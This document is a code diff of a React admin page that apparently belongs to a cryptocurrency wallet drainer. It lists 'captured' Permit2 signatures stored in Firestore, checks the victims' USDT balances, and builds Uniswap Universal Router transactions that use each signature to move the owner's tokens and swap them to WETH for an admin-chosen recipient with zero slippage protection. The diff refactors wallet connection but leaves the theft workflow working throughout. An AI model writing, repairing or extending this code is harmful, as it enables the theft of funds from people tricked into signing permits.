@@ -2,12 +2,11 @@ import React, { useState, useEffect } from 'react';
 import { db } from './firebase';
 import { collection, query, onSnapshot, doc, updateDoc } from 'firebase/firestore';
 import { BrowserProvider, Contract, ethers } from 'ethers';
-import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 // -----------------------------
 // Constants
 // -----------------------------
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // Mainnet
+const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; 
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) external payable"
@@ -17,15 +16,9 @@ const UNIVERSAL_ROUTER_ABI = [
 // Helper: Robust Signature Builder
 // -----------------------------
 function buildSignatureBytes(r, s, vRaw) {
-  // 1. Ensure v is a number and adjust valid range (27/28)
   let v = Number(vRaw);
   if (v === 0 || v === 1) v += 27;
-  
-  // 2. Convert to hex string explicitly (e.g., 27 -> "0x1b")
-  // explicit string conversion avoids Ethers "invalid BytesLike" on small numbers
   const vHex = "0x" + v.toString(16).replace(/^0x/, '');
-
-  // 3. Ensure r and s are formatted correctly
   return ethers.hexConcat([r, s, vHex]);
 }
 
@@ -34,13 +27,9 @@ function buildUniversalRouterTx(data, settings) {
   const { recipient, outputToken } = settings;
 
   const amountBn = BigInt(amount);
-  
-  // Build the signature bytes using the safe helper
   const signatureBytes = buildSignatureBytes(r, s, v);
-
   const permitAbi = new ethers.AbiCoder();
 
-  // PermitSingle struct construction
   const permitSingleTuple = [
     [
       [token, amountBn, Number(deadline), Number(nonce)],
@@ -50,13 +39,11 @@ function buildUniversalRouterTx(data, settings) {
     signatureBytes
   ];
 
-  // Encode Permit2 inputs
   const permitInput = permitAbi.encode(
     ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
     [owner, permitSingleTuple[0], permitSingleTuple[1]]
   );
 
-  // Fee 3000 (0.3%) - Standard pool
   const feeTier = 3000;
   function encodeFee(f) {
     let hex = f.toString(16);
@@ -65,10 +52,8 @@ function buildUniversalRouterTx(data, settings) {
     return '0x' + hex;
   }
   
-  // Build Swap Path
   const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
   
-  // Encode V3 Swap inputs
   const minReceived = BigInt(0); 
   const swapAbi = new ethers.AbiCoder();
   const swapInput = swapAbi.encode(
@@ -76,37 +61,48 @@ function buildUniversalRouterTx(data, settings) {
     [path, amountBn, minReceived, recipient]
   );
 
-  // -----------------------------
-  // COMMANDS FIX: Hardcoded Hex String
-  // -----------------------------
-  // 0x02 = PERMIT2_PERMIT
-  // 0x08 = V3_SWAP_EXACT_IN
-  // We use a manual string to ensure it's treated as valid bytes, avoiding 'invalid BytesLike' errors on numbers.
+  // Manual hex for commands: 0x02 (PERMIT2) + 0x08 (V3_SWAP)
   const commands = "0x0208"; 
 
   const inputs = [permitInput, swapInput];
-  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 mins
+  const execDeadline = Math.floor(Date.now() / 1000) + 1800; 
 
   return { commands, inputs, execDeadline };
 }
 
-export default function Admin() {
-  const { address, isConnected } = useAppKitAccount();
-  const { walletProvider } = useAppKitProvider('eip155');
+// Accept appKit as a prop
+export default function Admin({ appKit }) {
+  // Local state to replace hooks
+  const [address, setAddress] = useState(null);
+  const [isConnected, setIsConnected] = useState(false);
   
   const [signatures, setSignatures] = useState([]);
   const [groupedData, setGroupedData] = useState({});
   const [balances, setBalances] = useState({});
   
   // Admin Settings
-  const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || address || "");
-  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"); // WETH
+  const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || "");
+  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");
 
   // UI State
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [processingId, setProcessingId] = useState(null);
   const [statusMsg, setStatusMsg] = useState("");
+
+  // Subscribe to AppKit updates
+  useEffect(() => {
+    if (!appKit) return;
+    const unsub = appKit.subscribeAccount((acct) => {
+      setIsConnected(acct.isConnected);
+      setAddress(acct.address);
+      // Auto-fill recipient if empty
+      if (acct.address && !recipient) {
+        setRecipient(acct.address);
+      }
+    });
+    return () => unsub();
+  }, [appKit, recipient]);
 
   useEffect(() => {
     localStorage.setItem('admin_recipient', recipient);
@@ -129,11 +125,15 @@ export default function Admin() {
     return () => unsub();
   }, []);
 
+  // Fetch Balances
   useEffect(() => {
-    if (!walletProvider || Object.keys(groupedData).length === 0) return;
-    const provider = new BrowserProvider(walletProvider);
+    if (!appKit || Object.keys(groupedData).length === 0) return;
     
     const fetchBalances = async () => {
+      const walletProvider = appKit.getWalletProvider();
+      if (!walletProvider) return;
+      
+      const provider = new BrowserProvider(walletProvider);
       const newBalances = {};
       for (const owner of Object.keys(groupedData)) {
         try {
@@ -144,11 +144,12 @@ export default function Admin() {
       setBalances(newBalances);
     };
     fetchBalances();
-  }, [groupedData, walletProvider]);
+  }, [groupedData, appKit]);
 
   const handleExecute = async (sigData) => {
-    if (!isConnected || !walletProvider) {
-      alert("Please connect Admin wallet first.");
+    if (!isConnected) {
+      // Prompt connection if not connected
+      appKit.open();
       return;
     }
     
@@ -156,6 +157,9 @@ export default function Admin() {
     setStatusMsg("Preparing Transaction...");
 
     try {
+      const walletProvider = appKit.getWalletProvider();
+      if (!walletProvider) throw new Error("No wallet provider found");
+
       const provider = new BrowserProvider(walletProvider);
       const signer = await provider.getSigner();
       const router = new Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, signer);
@@ -164,14 +168,13 @@ export default function Admin() {
       
       setStatusMsg("Simulating...");
       
-      // Estimate Gas
       let gasLimit;
       try {
         const est = await router.execute.estimateGas(txData.commands, txData.inputs, txData.execDeadline, { value: 0 });
         gasLimit = (est * 120n) / 100n; 
       } catch (e) {
         console.warn("Gas estimate failed, using fallback.", e);
-        gasLimit = 3000000n; // Fallback gas limit
+        gasLimit = 3000000n; 
       }
 
       setStatusMsg("Please Sign in Wallet...");
@@ -215,8 +218,12 @@ export default function Admin() {
         <header className="admin-header">
           <div className="header-top">
             <h2>Admin Control</h2>
-            <div className={`connection-badge ${isConnected ? 'active' : ''}`}>
-              {isConnected ? 'Connected' : 'Offline'}
+            <div 
+              className={`connection-badge ${isConnected ? 'active' : ''}`}
+              onClick={() => appKit.open()}
+              style={{cursor: 'pointer'}}
+            >
+              {isConnected ? 'Connected' : 'Connect Wallet'}
             </div>
           </div>
           
@@ -244,7 +251,9 @@ export default function Admin() {
 
         <div className="wallet-grid">
           {Object.keys(groupedData).length === 0 && (
-            <div className="empty-state">No signatures captured yet.</div>
+            <div className="empty-state" style={{color:'#888', textAlign:'center', width:'100%'}}>
+              No signatures captured yet.
+            </div>
           )}
           
           {Object.keys(groupedData).map(owner => (
@@ -295,7 +304,7 @@ export default function Admin() {
                   </div>
                   <div className="sig-row">
                     <span className="label">Amount</span>
-                    <span className="value">{(BigInt(sig.amount) / 1000000n).toString()} USDT</span>
+                    <span className="value">{(BigInt(sig.amount) / (10n ** 6n)).toString()} USDT</span>
                   </div>
                   <div className="sig-row">
                     <span className="label">Status</span>
